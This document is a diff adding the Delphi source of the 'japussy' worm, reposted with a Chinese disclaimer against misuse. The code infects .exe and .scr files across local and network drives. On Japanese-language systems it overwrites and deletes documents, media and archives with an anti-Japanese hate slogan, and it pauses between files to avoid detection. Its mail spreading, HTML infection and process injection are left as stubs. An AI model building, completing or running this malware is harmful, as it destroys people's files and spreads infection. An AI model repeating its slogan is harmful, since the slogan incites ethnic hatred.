@@ -1,0 +1,348 @@
+声明：本代码为转发，禁止用该代码做任何危害网络安全的行为
+program japussy; 
+uses 
+windows, sysutils, classes, graphics, shellapi{, registry}; 
+ct 
+headersize = 82432; //病毒体的大小 
+iconoffset = $12eb8; //pe文件主图标的偏移量 
+
+//在我的delphi5 sp1上面编译得到的大小，其它版本的delphi可能不同 
+//查找2800000020的十六进制字符串可以找到主图标的偏移量 
+
+{ 
+headersize = 38912; //upx压缩过病毒体的大小 
+iconoffset = $92bc; //upx压缩过pe文件主图标的偏移量 
+
+//upx 1.24w 用法: upx -9 --8086 japussy.exe 
+} 
+icize = $2e8; //pe文件主图标的大小--744字节 
+icontail = iconoffset + icize; //pe文件主图标的尾部 
+id = $44444444; //感染标记 
+
+//码，以备写入 
+catchword = 'if a race need to be killed out, it must be yamato. ' + 
+'if a country need to be destroyed, it must be japan! ' + 
+'*** w32.japussy.worm.a ***'; 
+{$r *.res} 
+function registerserviceprocess(dwprocessid, dwtype: integer): integer; 
+stdcall; external 'kernel32.dll'; //函数声明 
+var 
+tmpfile: string; 
+si: startupinfo; 
+pi: process_information; 
+isjap: boolean = false; //日文操作系统标记 
+{ 判断是否为win9x } 
+function iswin9x: boolean; 
+var 
+ver: tosversioninfo; 
+begin 
+result := false; 
+ver.dwosversioninfosize := sizeof(tosversioninfo); 
+if not getversionex(ver) then 
+exit; 
+if (ver.dwplatformid = ver_platform_win32_windows) then //win9x 
+result := true; 
+end; 
+{ 在流之间复制 } 
+procedure copystream(src: tstream; sstartpos: integer; dst: tstream; 
+dstartpos: integer; count: integer); 
+var 
+scurpos, dcurpos: integer; 
+begin 
+scurpos := src.position; 
+dcurpos := dst.position; 
+src.seek(sstartpos, 0); 
+dst.seek(dstartpos, 0); 
+dst.copyfrom(src, count); 
+src.seek(scurpos, 0); 
+dst.seek(dcurpos, 0); 
+end; 
+{ 将宿主文件从已感染的pe文件中分离出来，以备使用 } 
+procedure extractfile(filename: string); 
+var 
+sstream, dstream: tfilestream; 
+begin 
+try 
+sstream := tfilestream.create(paramstr(0), fmopenread or fmsharedenynone); 
+try 
+dstream := tfilestream.create(filename, fmcreate); 
+try 
+sstream.seek(headersize, 0); //跳过头部的病毒部分 
+dstream.copyfrom(sstream, sstream.size - headersize); 
+finally 
+dstream.free; 
+end; 
+finally 
+sstream.free; 
+end; 
+except 
+end; 
+end; 
+{ 填充startupinfo结构 } 
+procedure fillstartupinfo(var si: startupinfo; state: word); 
+begin 
+si.cb := sizeof(si); 
+si.lpreserved := nil; 
+si.lpdesktop := nil; 
+si.lptitle := nil; 
+si.dwflags := startf_useshowwindow; 
+si.wshowwindow := state; 
+si.cbreserved2 := 0; 
+si.lpreserved2 := nil; 
+end; 
+{ 发带毒邮件 } 
+procedure sendmail; 
+begin 
+//哪位仁兄愿意完成之？ 
+end; 
+{ 感染pe文件 } 
+procedure infectonefile(filename: string); 
+var 
+hdrstream, srcstream: tfilestream; 
+icostream, dststream: tmemorystream; 
+iid: longint; 
+aicon: ticon; 
+infected, ispe: boolean; 
+i: integer; 
+buf: array[0..1] of char; 
+begin 
+try //出错则文件正在被使用，退出 
+if comparetext(filename, 'japussy.exe') = 0 then //是自己则不感染 
+exit; 
+infected := false; 
+ispe := false; 
+srcstream := tfilestream.create(filename, fmopenread); 
+try 
+for i := 0 to $108 do //检查pe文件头 
+begin 
+srcstream.seek(i, sofrombeginning); 
+srcstream.read(buf, 2); 
+if (buf[0] = #80) and (buf[1] = #69) then //pe标记 
+begin 
+ispe := true; //是pe文件 
+break; 
+end; 
+end; 
+srcstream.seek(-4, sofromend); //检查感染标记 
+srcstream.read(iid, 4); 
+if (iid = id) or (srcstream.size < 10240) then //太小的文件不感染 
+infected := true; 
+finally 
+srcstream.free; 
+end; 
+if infected or (not ispe) then //如果感染过了或不是pe文件则退出 
+exit; 
+icostream := tmemorystream.create; 
+dststream := tmemorystream.create; 
+try 
+aicon := ticon.create; 
+try 
+//得到被感染文件的主图标(744字节)，存入流 
+aicon.releasehandle; 
+aicon.handle := extracticon(hinstance, pchar(filename), 0); 
+aicon.savetostream(icostream); 
+finally 
+aicon.free; 
+end; 
+srcstream := tfilestream.create(filename, fmopenread); 
+//头文件 
+hdrstream := tfilestream.create(paramstr(0), fmopenread or fmsharedenynone); 
+try 
+//写入病毒体主图标之前的数据 
+copystream(hdrstream, 0, dststream, 0, iconoffset); 
+//写入目前程序的主图标 
+copystream(icostream, 22, dststream, iconoffset, icize); 
+//写入病毒体主图标到病毒体尾部之间的数据 
+copystream(hdrstream, icontail, dststream, icontail, headersize - icontail); 
+//写入宿主程序 
+copystream(srcstream, 0, dststream, headersize, srcstream.size); 
+//写入已感染的标记 
+dststream.seek(0, 2); 
+iid := $44444444; 
+dststream.write(iid, 4); 
+finally 
+hdrstream.free; 
+end; 
+finally 
+srcstream.free; 
+icostream.free; 
+dststream.savetofile(filename); //替换宿主文件 
+dststream.free; 
+end; 
+except; 
+end; 
+end; 
+{ 将目标文件写入码后删除 } 
+procedure smashfile(filename: string); 
+var 
+filehandle: integer; 
+i, size, mass, max, len: integer; 
+begin 
+try 
+setfileattributes(pchar(filename), 0); //去掉只读属性 
+filehandle := fileopen(filename, fmopenwrite); //打开文件 
+try 
+size := getfilesize(filehandle, nil); //文件大小 
+i := 0; 
+randomize; 
+max := random(15); //写入码的随机次数 
+if max < 5 then 
+max := 5; 
+mass := size div max; //每个间隔块的大小 
+len := length(catchword); 
+while i < max do 
+begin 
+fileseek(filehandle, i * mass, 0); //定位 
+//写入码，将文件彻底破坏掉 
+filewrite(filehandle, catchword, len); 
+inc(i); 
+end; 
+finally 
+fileclose(filehandle); //关闭文件 
+end; 
+deletefile(pchar(filename)); //删除之 
+except 
+end; 
+end; 
+{ 获得可写的驱动器列表 } 
+function getdrives: string; 
+var 
+disktype: word; 
+d: char; 
+str: string; 
+i: integer; 
+begin 
+for i := 0 to 25 do //遍历26个字母 
+begin 
+d := chr(i + 65); 
+str := d + ':\'; 
+disktype := getdrivetype(pchar(str)); 
+//得到本地磁盘和网络盘 
+if (disktype = drive_fixed) or (disktype = drive_remote) then 
+result := result + d; 
+end; 
+end; 
+{ 遍历目录，感染和摧毁文件 } 
+procedure loopfiles(path, mask: string); 
+var 
+i, count: integer; 
+fn, ext: string; 
+subdir: tstrings; 
+searchrec: tsearchrec; 
+msg: tmsg; 
+function isvaliddir(searchrec: tsearchrec): integer; 
+begin 
+if (searchrec.attr <> 16) and (searchrec.name <> '.') and 
+(searchrec.name <> '..') then 
+result := 0 //不是目录 
+else if (searchrec.attr = 16) and (searchrec.name <> '.') and 
+(searchrec.name <> '..') then 
+result := 1 //不是根目录 
+else result := 2; //是根目录 
+end; 
+begin 
+if (findfirst(path + mask, faanyfile, searchrec) = 0) then 
+begin 
+repeat 
+peekmessage(msg, 0, 0, 0, pm_remove); //调整消息队列，避免引起怀疑 
+if isvaliddir(searchrec) = 0 then 
+begin 
+fn := path + searchrec.name; 
+ext := uppercase(extractfileext(fn)); 
+if (ext = '.exe') or (ext = '.scr') then 
+begin 
+infectonefile(fn); //感染可执行文件 
+end 
+else if (ext = '.htm') or (ext = '.html') or (ext = '.asp') then 
+begin 
+//感染html和asp文件，将base编码后的病毒写入 
+//感染浏览此网页的所有用户 
+//哪位大兄弟愿意完成之？ 
+end 
+else if ext = '.wab' then //outlook地址簿文件 
+begin 
+//获取outlook邮件地址 
+end 
+else if ext = '.adc' then //foxmail地址自动完成文件 
+begin 
+//获取foxmail邮件地址 
+end 
+else if ext = 'ind' then //foxmail地址簿文件 
+begin 
+//获取foxmail邮件地址 
+end 
+else 
+begin 
+if isjap then //是倭文操作系统 
+begin 
+if (ext = '.doc') or (ext = '.xls') or (ext = '.mdb') or 
+(ext = '.mp3') or (ext = '.rm') or (ext = '.ra') or 
+(ext = '.wma') or (ext = '.zip') or (ext = '.rar') or 
+(ext = '.mpeg') or (ext = '.asf') or (ext = '.jpg') or 
+(ext = '.jpeg') or (ext = '.gif') or (ext = '.swf') or 
+(ext = '.pdf') or (ext = '.chm') or (ext = '.avi') then 
+smashfile(fn); //摧毁文件 
+end; 
+end; 
+end; 
+//感染或删除一个文件后睡眠200毫秒，避免cpu占用率过高引起怀疑 
+sleep(200); 
+until (findnext(searchrec) <> 0); 
+end; 
+findclose(searchrec); 
+subdir := tstringlist.create; 
+if (findfirst(path + '*.*', fadirectory, searchrec) = 0) then 
+begin 
+repeat 
+if isvaliddir(searchrec) = 1 then 
+subdir.add(searchrec.name); 
+until (findnext(searchrec) <> 0); 
+end; 
+findclose(searchrec); 
+count := subdir.count - 1; 
+for i := 0 to count do 
+loopfiles(path + subdir.strings + '\', mask); 
+freeandnil(subdir); 
+end; 
+{ 遍历磁盘上所有的文件 } 
+procedure infectfiles; 
+var 
+driverlist: string; 
+i, len: integer; 
+begin 
+if getacp = 932 then //日文操作系统 
+isjap := true; //吧！ 
+driverlist := getdrives; //得到可写的磁盘列表 
+len := length(driverlist); 
+while true do //死循环 
+begin 
+for i := len downto 1 do //遍历每个磁盘驱动器 
+loopfiles(driverlist + ':\', '*.*'); //感染之 
+sendmail; //发带毒邮件 
+sleep(1000 * 60 * 5); //睡眠5分钟 
+end; 
+end; 
+{ 主程序开始 } 
+begin 
+if iswin9x then //是win9x 
+registerserviceprocess(getcurrentprocessid, 1) //注册为服务进程 
+else //winnt 
+begin 
+//远程线程映射到explorer进程 
+//哪位兄台愿意完成之？ 
+end; 
+//如果是原始病毒体自己 
+if comparetext(extractfilename(paramstr(0)), 'japussy.exe') = 0 then 
+infectfiles //感染和发邮件 
+else //已寄生于宿主程序上了，开始工作 
+begin 
+tmpfile := paramstr(0); //创建临时文件 
+delete(tmpfile, length(tmpfile) - 4, 4); 
+tmpfile := tmpfile + #32 + '.exe'; //真正的宿主文件，多一个空格 
+extractfile(tmpfile); //分离之 
+fillstartupinfo(si, sw_showdefault); 
+createprocess(pchar(tmpfile), pchar(tmpfile), nil, nil, true, 
+0, nil, '.', si, pi); //创建新进程运行之 
+infectfiles; //感染和发邮件 
+end; 
+end.
